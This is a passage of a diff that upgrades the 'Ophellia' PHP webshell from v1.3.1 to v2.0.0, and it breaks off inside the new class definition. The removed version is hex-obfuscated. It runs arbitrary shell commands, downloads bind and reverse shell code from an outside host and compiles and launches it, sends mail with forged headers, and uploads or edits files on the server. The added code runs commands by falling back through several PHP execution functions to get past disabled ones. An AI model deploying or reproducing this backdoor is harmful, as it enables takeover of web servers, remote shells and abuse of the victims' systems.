@@ -1,327 +1,1012 @@
 <?php
-/*
-              Ophellia Webshell
-            v1.3.1 - 'Neko Hacker'
-          copyright @elliottophellia
+declare (strict_types = 1);
 
-           illegal use is prohibited
-      github.com/elliottophellia/ophellia
-*/
-$pass = '4224a581bd4cf8d705fac8cc86e92113'; // nekohacker
-function hlx($rr)
+/*
+Ophellia v2.0.0 - 'HoneyComeBear'
+copyright @elliottophellia
+
+illegal use is prohibited
+github.com/elliottophellia/ophellia
+ */
+
+// Configuration
+const VERSION = '2.0.0-light';
+// you can change theme by simply change version with -theme 
+// eg. VERSION = '2.0.0-dark';
+const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2'; // honeycomebear
+// Use "<?php echo password_hash('your_new_password', PASSWORD_BCRYPT);" to generate a new password hash
+// Or go to https://onlinephp.io/password-hash ($algo = PASSWORD_BCRYPT, $cost = 10)
+
+// Utility functions
+function hexToString(string $hex): string
 {
-  $xx = '';
-  for ($c = 0; $c < strlen($rr); $c += 2) {
-    $xx .= chr(hexdec($rr[$c] . $rr[$c + 1]));
-  }
-  return $xx;
+    return pack('H*', $hex);
 }
-function xlh($string)
+
+function stringToHex(string $string): string
 {
-  $hex = '';
-  for ($i = 0; $i < strlen($string); $i++) $hex .= dechex(ord($string[$i]));
-  return $hex;
+    return bin2hex($string);
 }
-function sf($f, $t)
+
+function safeFileWrite(string $filename, string $content): bool
 {
-  $w = @fopen($f, "w") or @"\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73"('file_put_contents');
-  if ($w) {
-    @fwrite($w, $t) or @fputs($w, $t) or @"\x66\x69\x6C\x65\x5F\x70\x75\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73"($f, $t);
-    @fclose($w);
-  }
+    return file_put_contents($filename, $content) !== false;
 }
-function fsize($file)
+
+function verifyPassword(string $password): bool
 {
-  $a = ["B", "KB", "MB", "GB", "TB", "PB"];
-  $size = "\x66\x69\x6c\x65\x73\x69\x7a\x65"($file);
-  $pos = min((int)log($size, 1024), count($a) - 1);
-  $size /= pow(1024, $pos);
-  return round($size, 2) . " " . $a[$pos];
+    return password_verify($password, PASSWORD_HASH);
 }
-function lasmod($file)
+
+function formatFileSize($bytes): string
 {
-  return date("d/m/y - H:i:s", "\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"($file));
+    $bytes = (float) $bytes; // Convert to float to handle large values
+    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    $bytes = max($bytes, 0);
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow = min($pow, count($units) - 1);
+    $bytes /= (1 << (10 * $pow));
+    return round($bytes, 2) . ' ' . $units[$pow];
 }
-function perms($file)
+
+function getLastModified(string $file): string
 {
-  if ($perms = @"\x66\x69\x6c\x65\x70\x65\x72\x6d\x73"($file)) {
-    $flag = '-';
-    $flagTypes = [0xC000 => 's', 0xA000 => 'l', 0x8000 => '-', 0x6000 => 'b', 0x4000 => 'd', 0x2000 => 'c', 0x1000 => 'p',];
-    foreach ($flagTypes as $mask => $type) {
-      if (($perms & $mask) == $mask) {
-        $flag = $type;
-        break;
-      }
+    return date("d/m/y-H:i:s", filemtime($file));
+}
+
+function getFilePermissions(string $file): string
+{
+    $perms = fileperms($file);
+    if ($perms === false) {
+        return "<span style='color: #bf616a;'>????</span>"; // Nord red for error
     }
-    $permissions = [00400 => 'r', 00200 => 'w', 00100 => 'x', 00040 => 'r', 00020 => 'w', 00010 => 'x', 00004 => 'r', 00002 => 'w', 00001 => 'x',];
-    foreach ($permissions as $mask => $permission) {
-      $flag .= ($perms & $mask) ? $permission : '-';
-    }
-    return $flag;
-  } else {
-    return substr(sprintf('%o', fileperms($file)), -4);
-  }
+
+    $info = '';
+    $info .= (($perms & 0xC000) == 0xC000) ? 's' : ((($perms & 0xA000) == 0xA000) ? 'l' : ((($perms & 0x8000) == 0x8000) ? '-' : 'd'));
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+
+    $color = is_writable($file) ? '#a3be8c' : '#bf616a'; // Nord green if writable, Nord red if not
+
+    return "<span style='color: $color;'>$info</span>";
 }
-function goog($item)
+
+function getOwnerGroup(string $item): string
 {
-  $downer = "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73"("posix_getpwuid") ? @"\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64"("\x66\x69\x6c\x65\x6f\x77\x6e\x65\x72"($item))['name'] : "\x66\x69\x6c\x65\x6f\x77\x6e\x65\x72"($item);
-  $dgrp = "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73"("posix_getgrgid") ? @"\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64"("\x66\x69\x6c\x65\x67\x72\x6f\x75\x70"($item))['name'] : "\x66\x69\x6c\x65\x67\x72\x6f\x75\x70"($item);
-  return $downer . '/' . $dgrp;
+    $owner = function_exists("posix_getpwuid") ? posix_getpwuid(fileowner($item))['name'] : fileowner($item);
+    $group = function_exists("posix_getgrgid") ? posix_getgrgid(filegroup($item))['name'] : filegroup($item);
+    return "$owner/$group";
 }
-function gtyp($file)
+
+function getFileType(string $file): string
 {
-  $gtyp = ("\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73"('mime_content_type')) ? "\x6d\x69\x6d\x65\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x5f\x74\x79\x70\x65"($file) : "\x66\x69\x6c\x65\x74\x79\x70\x65"($file);
-  return $gtyp;
+    return mime_content_type($file) ?: filetype($file) ?: 'Unknown';
 }
-"\x65\x72\x72\x6F\x72\x5F\x72\x65\x70\x6F\x72\x74\x69\x6E\x67"(0);
-"\x73\x65\x74\x5F\x74\x69\x6D\x65\x5F\x6C\x69\x6D\x69\x74"(0);
-"\x6F\x62\x5F\x73\x74\x61\x72\x74"();
-"\x69\x6E\x69\x5F\x73\x65\x74"('max_execution_time', 0);
-"\x69\x6E\x69\x5F\x73\x65\x74"('output_buffering', 0);
-"\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
-echo '<html><head><title>o p h e l l i a</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><style>@import url(//rei.my.id/style.css);</style><body>';
-if ("\x6D\x64\x35"(${"\x5f\x50\x4f\x53\x54"}['pass']) == $pass) {
-  "\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
-  ${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass'] = $pass;
-}
-if (isset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']) == $pass) {
-  if ("\x69\x6E\x69\x5F\x67\x65\x74"('safe_mode')) {
-    $Safe = "<b>ON</b>";
-  } else {
-    $Safe = "<b>OFF</b>";
-  }
-  if (isset(${"\x5F\x47\x45\x54"}['d'])) {
-    $path = hlx(${"\x5F\x47\x45\x54"}['d']);
-    "\x63\x68\x64\x69\x72"(hlx(${"\x5F\x47\x45\x54"}['d']));
-  } else {
-    $path = "\x67\x65\x74\x63\x77\x64"();
-  }
-  if (isset($mkdir)) {
-    $mkdir = $path . "/" . ${"\x5F\x47\x45\x54"}['mkdir'];
-  }
-  if (isset($mkfile)) {
-    $mkfile = $path . "/" . ${"\x5F\x47\x45\x54"}['mkfile'];
-  }
-  $f = hlx(${"\x5F\x47\x45\x54"}['f']);
-  $fedit = hlx(${"\x5F\x47\x45\x54"}['fedit']);
-  $gwejh = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"(${"\x5f\x50\x4f\x53\x54"}['gwejh']);
-  $mkdir = ${"\x5F\x47\x45\x54"}['mkdir'];
-  $tools = ${"\x5F\x47\x45\x54"}['t'];
-  $rmdir = hlx(${"\x5F\x47\x45\x54"}['rmdir']);
-  $mkfile = ${"\x5F\x47\x45\x54"}['mkfile'];
-  $cndir = ${"\x5F\x47\x45\x54"}['cndir'];
-  $file = ${"\x5f\x53\x45\x52\x56\x45\x52"}['PHP_SELF'];
-  $root = ${"\x5f\x53\x45\x52\x56\x45\x52"}['DOCUMENT_ROOT'];
-  $bytes = "\x64\x69\x73\x6b\x5f\x66\x72\x65\x65\x5f\x73\x70\x61\x63\x65"(".");
-  $rfile = hlx(${"\x5F\x47\x45\x54"}['rfile']);
-  $rename = ${"\x5F\x47\x45\x54"}['rename'];
-  $path = "\x73\x74\x72\x5f\x72\x65\x70\x6c\x61\x63\x65"('\\', '/', $path);
-  $si_prefix = array('B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB');
-  $class = min((int)log($bytes, 1024), count($si_prefix) - 1);
-  $size = sprintf('%1.2f', $bytes / pow(1024, $class)) . ' ' . $si_prefix[$class];
-  echo '<a href="?"><img src="//bit.ly/ophelliaa" width="380" /></a><br /><button><a href="?"><b>HOME</b><a></button> <button><a href="' . $file . '?t=' . xlh('upload') . '&d=' . xlh($path) . '"><b>UPLOAD</b></a></button> <button><a href="' . $file . '?t=' . xlh('network') . '&d=' . xlh($path) . '"><b>NETWORK</b></a></button> <button><a href="' . $file . '?t=' . xlh('mailer') . '&d=' . xlh($path) . '"><b>MAILER</b></a></button> <button><a href="' . $file . '?t=' . xlh('info') . '&d=' . xlh($path) . '"><b>INFO</b></a></button> <button><a href="' . $file . '?exit"><b>LOGOUT</b></a></button><br /><form method="post" action=""><input id="ememm" type="text" name="gwejh" value="uname -a"> <input type="submit" value="X" /></form><br /><form method="get" action=""><input id="emem" type="text" name="mkfile" value="CreateFile.php"> <input type="hidden" name="d" value="' . xlh($path) . '"> <input type="submit" value="X" /></form><form method="get" action=""><input id="emem" type="text" name="mkdir" placeholder="CreateDir"> <input type="hidden" name="d" value="' . xlh($path) . '"><input type="submit" value="X" /></form><br /><form method="get" action=""><input id="ememm" type="text" name="cndir" value=' . $path . '>&nbsp;<input type="submit" value="X" /></form>';
-  if (isset($gwejh)) {
-    if (!empty($gwejh)) {
-      echo "<textarea rows=\"15\" name=\"text\" readonly>";
-      echo "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"($gwejh);
-      echo "</textarea>";
-    }
-  }
-  if (isset($tools)) {
-    if (hlx($tools) == 'network') {
-      $pty = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/back_connect/python.txt');
-      $rby = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/back_connect/ruby.txt');
-      $bcc = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/back_connect/c.txt');
-      $bcp = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/back_connect/perl.txt');
-      $bpc = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/bind_shell/c.txt');
-      $bpp = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/bind_shell/perl.txt');
-      echo '<h2>Network Tools</h2><h3>Bind Shell</h3><form method="post" action="">IP: <input type="text" name="ip" value="' . "\x67\x65\x74\x68\x6f\x73\x74\x62\x79\x6e\x61\x6d\x65"(${"\x5f\x53\x45\x52\x56\x45\x52"}['HTTP_HOST']) . '" readonly> Port: <input type="text" name="port" value="31337"> Type: <select name="type"><option value="cb">C</option><option value="pb">Perl</option><option value="rbb">Ruby</option><option value="pyb">Python</option></select><input type="submit" value="Execute"/></form><br/><h3>Reverse Shell</h3><form method="post" action="">IP: <input type="text" name="ip" value=""> Port: <input type="text" name="port" value="31337"> Type: <select name="type"><option value="cbc">C</option><option value="pbc">Perl</option><option value="rbbc">Ruby</option><option value="pybc">Python</option></select><input type="submit" value="Execute"/></form>';
-      if (isset(${"\x5f\x50\x4f\x53\x54"}['type'])) {
-          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'cb') {
-              sf('/tmp/cb.c', $bpc);
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('gcc -o /tmp/cb /tmp/cb.c');
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('/tmp/cb ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
-              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep cb') . "<pre>";
-          }
-          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'pb') {
-              sf('/tmp/pb.pl', $bpp);
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('perl /tmp/pb.pl ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
-              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep pb') . "<pre>";
-          }
-          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'cbc') {
-              sf('/tmp/cbc.c', $bcc);
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('gcc -o /tmp/cbc /tmp/cbc.c');
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('/tmp/cbc ' . ${"\x5f\x50\x4f\x53\x54"}['ip'] . ' ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
-              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep cbc') . "<pre>";
-          }
-          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'pbc') {
-              sf('/tmp/pbc.pl', $bcp);
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('perl /tmp/pbc.pl ' . ${"\x5f\x50\x4f\x53\x54"}['ip'] . ' ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
-              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep pbc') . "<pre>";
-          }
-          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'rbb') {
-              sf('/tmp/rbb.rb', $rby);
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ruby /tmp/rbb.rb ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
-              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep rbb') . "<pre>";
-          }
-          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'rbbc') {
-              sf('/tmp/rbbc.rb', $rby);
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ruby /tmp/rbbc.rb ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' ' . ${"\x5f\x50\x4f\x53\x54"}['ip'] . ' &');
-              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep rbbc') . "<pre>";
-          }
-          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'pyb') {
-              sf('/tmp/pyb.py', $pty);
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('python /tmp/pyb.py ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
-              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep pyb') . "<pre>";
-          }
-          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'pybc') {
-              sf('/tmp/pybc.py', $pty);
-              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('python /tmp/pybc.py ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' ' . ${"\x5f\x50\x4f\x53\x54"}['ip'] . ' &');
-              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep pybc') . "<pre>";
-          }
-      }
-      die();
-  }
-    if (hlx($tools) == 'mailer') {
-      echo '<h2>Mailer Tools</h2><form method="post" action="">From: <input type="text" name="from" value="ophellia@' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'] . '"> To: <input type="text" name="to" value="contact@rei.my.id"> Subject: <input type="text" name="subject" value="im using your webshell!"><br><textarea name="message" style="width: 40%;" rows="15">my ip address is ' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['REMOTE_ADDR'] . '</textarea><br><input type="submit" value="Execute"/></form><pre>';
-      if (isset(${"\x5f\x50\x4f\x53\x54"}['from'])) {
-        $headers = "From: Ophellia <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
-        $headers .= "Reply-To: Ophellia <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
-        $headers .= "Return-Path: " . ${"\x5f\x50\x4f\x53\x54"}['from'] . PHP_EOL;
-        $headers .= "X-Mailer: Microsoft Outlook 16.0";
-        "\x6d\x61\x69\x6c"(${"\x5f\x50\x4f\x53\x54"}['to'], ${"\x5f\x50\x4f\x53\x54"}['subject'], ${"\x5f\x50\x4f\x53\x54"}['message'], $headers);
-        echo "Mail Sent !";
-      }
-      echo '</pre>';
-      die();
-    }
-    if (hlx($tools) == 'upload') {
-      echo "<h2>Upload Tools</h2><form method='post' enctype='multipart/form-data'><div style='justify-content: center'><input type='radio' name='uploadtype' value='1' checked>current_dir [ $path ]<br/><input type='radio' name='uploadtype' value='2'>document_root [ $root ]</div><br/><input type='file' name='upload'> <input type='submit' value='upload' name='upload'></form><br/>";
-      if (isset(${"\x5f\x50\x4f\x53\x54"}['upload'])) {
-        if (${"\x5f\x50\x4f\x53\x54"}['uploadtype'] == 1) {
-          $tmp = $_FILES['upload']['tmp_name'];
-          $up = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['upload']['name']);
-          if ("\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($tmp, $path . "/" . $up)) {
-            echo "<b>SUCCESSFULLY UPLOADED</b>";
-          } else {
-            echo "<b>FAILED TO UPLOAD FILE</b>";
-          }
-        } else {
-          $tmp = $_FILES['upload']['tmp_name'];
-          $up = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['upload']['name']);
-          if ("\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($tmp, $root . "/" . $up)) {
-            echo "<b>SUCCESSFULLY UPLOADED</b>";
-          } else {
-            echo "<b>FAILED TO UPLOAD FILE</b>";
-          }
+
+function getFunctionalCmd(string $cmd): string
+{
+    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
+    $obfuscated = base64_encode(serialize($funcs));
+    $deobfuscate = function ($x) {return unserialize(base64_decode($x));};
+
+    foreach ($deobfuscate($obfuscated) as $func) {
+        if (function_exists($func)) {
+            return obfuscatedExecution($func, $cmd);
         }
-      }
-      die();
     }
-    if (hlx($tools) == 'info') {
-      $disable_functions = (!empty(@"\x69\x6E\x69\x5F\x67\x65\x74"('disable_functions'))) ? "<b>" . @"\x69\x6E\x69\x5F\x67\x65\x74"('disable_functions') . "</b>" : "<b>NONE</b>";
-      echo "<div id=\"l\"><pre>System           : " . @"\x70\x68\x70\x5f\x75\x6e\x61\x6d\x65"('a') . " " . ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_SOFTWARE'] . "<br/>User             : " . "\x67\x65\x74\x5f\x63\x75\x72\x72\x65\x6e\x74\x5f\x75\x73\x65\x72"() . "<br/>Free Space       : $size<br/>Server IP        : " . "\x67\x65\x74\x68\x6f\x73\x74\x62\x79\x6e\x61\x6d\x65"(${"\x5f\x53\x45\x52\x56\x45\x52"}['HTTP_HOST']) . "<br/>Client IP        : " . ${"\x5f\x53\x45\x52\x56\x45\x52"}['REMOTE_ADDR'] . "<br/>Safe Mode        : $Safe<br/>PHP Version      : " . @"\x70\x68\x70\x76\x65\x72\x73\x69\x6f\x6e"() . "<br/>Disable Function : $disable_functions";
-      echo "</pre></div>";
-      die();
-    }
-  }
-  if (isset($rfile) and "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"($rfile)) {
-    if ("\x75\x6e\x6c\x69\x6e\x6b"($rfile)) {
-      echo ("<br/><b>File $rfile Deleted</b>");
-    } else {
-      echo ("<br/><b>File $rfile Not Deleted</b>");
-    }
-  }
-  if (isset($mkdir)) {
-    if (!empty($mkdir)) {
-      if (mkdir($mkdir, 0777, true)) {
-        echo "<br/><b>Directory $mkdir Created</b>";
-      } else {
-        echo "<br/><b>Directory $mkdir Not Created</b>";
-      }
-    } else {
-      echo "<br/><b>Can't create folder with empty name</b>";
-    }
-  }
-  if (isset($mkfile)) {
-    echo '<form method="post" action=""><textarea rows="25" name="ftext"></textarea><br><div id="l"><br/><input type="text" name="fname" value="' . $mkfile . '"\> <input type="submit" value="Save"\> <button><a href="' . $file . '?d=' . xlh($path) . '">Back</a></button></div></form><br/>';
-    if (!empty(${"\x5f\x50\x4f\x53\x54"}['fname'])) {
-      if (${"\x5f\x50\x4f\x53\x54"}['fname'] && ${"\x5f\x50\x4f\x53\x54"}['ftext']) {
-        if ("\x66\x69\x6C\x65\x5F\x70\x75\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73"(${"\x5f\x50\x4f\x53\x54"}['fname'], ${"\x5f\x50\x4f\x53\x54"}['ftext'])) {
-          echo "<br/><b>File " . ${"\x5f\x50\x4f\x53\x54"}['fname'] . " Created</b>";
-        } else {
-          echo "<br/><b>File " . ${"\x5f\x50\x4f\x53\x54"}['fname'] . " Not Created</b>";
-        }
-      }
-    } else {
-      echo "<br/><b>Can't create file with empty name</b>";
-    }
-  }
-  if (isset($rmdir) and "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"($rmdir)) {
-    if ("\x72\x6d\x64\x69\x72"($rmdir)) {
-      echo "<br/><b>Directory $rmdir Deleted</b>";
-    } else {
-      echo "<br/><b>Directory $rmdir Not Deleted</b>";
-    }
-  }
-  if (isset($cndir)) {
-    $dir = $cndir;
-    $rr = ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'] . "$file?d=" . xlh($dir);
-    header("Location: http://$rr");
-  }
-  if (isset($rename)) {
-    echo '<br/><br/><form method="post" action="">Old Name: <input type="text" name="oldname" value="' . hlx(${"\x5F\x47\x45\x54"}['oldname']) . '" readonly> New Name: <input type="text" name="newname" value=""> <input type="submit" value="Execute"/> <button><a href="' . $file . '?d=' . xlh($path) . '">Back</a></button></form><pre>';
-    if (${"\x5f\x50\x4f\x53\x54"}['oldname'] && ${"\x5f\x50\x4f\x53\x54"}['newname']) {
-      if (isset(${"\x5f\x50\x4f\x53\x54"}['oldname'])) {
-        rename(${"\x5f\x50\x4f\x53\x54"}['oldname'], ${"\x5f\x50\x4f\x53\x54"}['newname']);
-        echo '<b>Rename File Done.</b><br />';
-      } else {
-        echo '<b>Rename File Failed.</b><br />';
-      }
-    }
-    echo '</pre>';
-  }
-  if (isset($f) and "\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"($f)) {
-    $text = "\x68\x74\x6d\x6c\x65\x6e\x74\x69\x74\x69\x65\x73"("\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($f));
-    echo '<textarea rows="25" name="text" readonly>' . $text . '</textarea><br/><br/><div id="l"><button><a href="' . $file . '?d=' . xlh($path) . '">Back</a></button></div>';
-  }
-  if (isset($fedit) and "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"($fedit)) {
-    $text = "\x68\x74\x6d\x6c\x73\x70\x65\x63\x69\x61\x6c\x63\x68\x61\x72\x73"("\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($fedit));
-    echo '<form method="post" action=""><textarea rows="25" name="text">' . $text . '</textarea><br><br/><div id="l"><input type="submit" value="Save"\> <button><a href="' . $file . '?d=' . xlh($path) . '">Back</a></button></div></form><br/>';
-    if ("\x66\x69\x6C\x65\x5F\x65\x78\x69\x73\x74\x73"($fedit)) {
-      if (isset(${"\x5f\x50\x4f\x53\x54"}['text'])) {
-        $write = fopen($fedit, 'w');
-        $new_text = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"(${"\x5f\x50\x4f\x53\x54"}['text']);
-        if (fwrite($write, $new_text)) {
-          echo '<b>Edit File Done.</b><br />';
-        } else {
-          echo '<b>Edit File Failed.</b><br />';
-        }
-        fclose($write);
-      }
-    }
-  }
-  echo '<br /><table><thead><tr><th style="width:35%"> File Name </th><th style="width:7%"> Actions </th><th style="width:5%"> Filesize </th><th style="width:5%"> Filetype </th><th style="width:5%"> Permission </th><th style="width:8%"> Owner / Group </th><th style="width:8%"> Last Modified </th></tr></thead><tbody>';
-  foreach ("\x73\x63\x61\x6E\x64\x69\x72"($path) as $files) {
-    if (!is_dir($files)) continue;
-    if ($files == ".." | $files == ".") {
-      echo "<tr>\n                  <td><img src='//rei.my.id/fldr.png' /><b><a href='?d=" . xlh("\x64\x69\x72\x6e\x61\x6d\x65"($path)) . "'>$files</a></b></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>";
-    } else {
-      echo "<tr><td><img src='//rei.my.id/fldr.png' /><b><a href=$file?d=" . xlh($path . '/' . $files) . ">$files</a></b></td><td id='c'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; / <a href=$file?rmdir=" . xlh($files) . "&d=" . xlh($path) . ">RM</a> / <a href=?rename&oldname=" . xlh($files) . "&d=" . xlh($path) . ">CN</a></td>\n                  <td id='c'>-</td>\n                  <td id='c'>" . gtyp($files) . "</td>\n                  <td id='c'>" . perms($files) . "</td>\n                  <td id='c'>" . goog($files) . "</td>\n                  <td id='c'>" . lasmod($files) . "</td>\n              </tr>";
-    }
-  }
-  foreach ("\x73\x63\x61\x6E\x64\x69\x72"($path) as $files) {
-    if (!is_file($files)) continue;
-    echo "<tr><td><img src='//rei.my.id/file.png' /><a href=$file?f=" . xlh($files) . " &d=" . xlh($path) . ">$files</a></td><td id='c'><a href=$file?fedit=" . xlh($files) . "&d=" . xlh($path) . ">ED</a> / <a href=$file?rfile=" . xlh($files) . "&d=" . xlh($path) . ">RM</a> / <a href=?rename&oldname=" . xlh($files) . "&d=" . xlh($path) . ">CN</a></td>\n            <td id='c'>" . fsize($files) . "</td>\n            <td id='c'>" . gtyp($files) . "</td>\n            <td id='c'>" . perms($files) . "</td>\n            <td id='c'>" . goog($files) . "</td>\n            <td id='c'>" . lasmod($files) . "</td>\n        </tr>";
-  }
-  echo "</tbody></table><div id='r'><a href='//github.com/elliottophellia'>@elliottophellia</a></div>";
-  if (isset(${"\x5F\x47\x45\x54"}['exit'])) {
-    unset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']);
-    echo "<script>window.location.href='?';</script>";
-    exit();
-  }
-} else {
-  echo '<img src="//bit.ly/ophellia" width="200" /><br/><form action="" method="post"><input type="password" name="pass" style="border: none;"></form>';
+
+    return "No available function to execute command.";
 }
-header('X-Powered-By: Ophellia v1.3.1');
-echo '</body></html>';
+
+function obfuscatedExecution(string $func, string $cmd): string
+{
+    $encoded = base64_encode($cmd);
+    $decoded = base64_decode($encoded);
+
+    switch ($func) {
+        case 'shell_exec':
+        case 'exec':
+            return call_user_func($func, $decoded);
+        case 'system':
+        case 'passthru':
+            ob_start();
+            call_user_func($func, $decoded);
+            return ob_get_clean();
+        case 'proc_open':
+            return executeWithProc_open($decoded);
+        case 'popen':
+            return executeWithPopen($decoded);
+        default:
+            return "Unknown function: $func";
+    }
+}
+
+function executeWithProc_open(string $cmd): string
+{
+    $spec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
+    $proc = call_user_func('proc_open', $cmd, $spec, $pipes);
+    if (is_resource($proc)) {
+        fclose($pipes[0]);
+        $out = stream_get_contents($pipes[1]);
+        $err = stream_get_contents($pipes[2]);
+        array_map('fclose', array_slice($pipes, 1));
+        proc_close($proc);
+        return $err ? "Error: $err" : $out;
+    }
+    return "Failed to execute command using proc_open.";
+}
+
+function executeWithPopen(string $cmd): string
+{
+    $handle = call_user_func('popen', $cmd, 'r');
+    if ($handle) {
+        $output = stream_get_contents($handle);
+        pclose($handle);
+        return $output;
+    }
+    return "Failed to execute command using popen.";
+}
+
+class Elliottophellia
+{
+    private string $currentPath;
+    private array $get;
+    private array $post;
+    private array $files;
+    private string $selfFile;
+
+    public function __construct(array $get, array $post, array $files)
+    {
+        $this->get = $get;
+        $this->post = $post;
+        $this->files = $files;
